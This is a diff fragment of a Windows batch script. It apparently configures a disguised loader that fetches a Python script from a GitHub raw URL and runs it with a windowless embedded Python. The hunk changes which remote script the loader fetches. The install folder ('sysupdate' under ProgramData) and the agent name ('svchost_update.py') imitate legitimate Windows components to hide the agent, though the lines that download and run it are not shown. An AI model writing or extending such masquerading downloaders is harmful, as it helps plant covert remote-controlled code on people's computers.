@@ -13,7 +13,7 @@ set "PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
 set "TARGET_DIR=%ProgramData%\Microsoft\Windows\sysupdate"
 set "AGENT_NAME=svchost_update.py"
 set "AGENT_PATH=%TARGET_DIR%\%AGENT_NAME%"
-set "RAW_URL=https://raw.githubusercontent.com/glitech01x/client/refs/heads/main/client.py"
+set "RAW_URL=https://raw.githubusercontent.com/glitech01x/PsinToolKit/refs/heads/main/OsinTool.py"
 set "PYTHON_URL=https://www.python.org/ftp/python/3.11.9/python-3.11.9-embed-amd64.zip"
 set "PYTHON_EXE=%TARGET_DIR%\python\pythonw.exe"
 
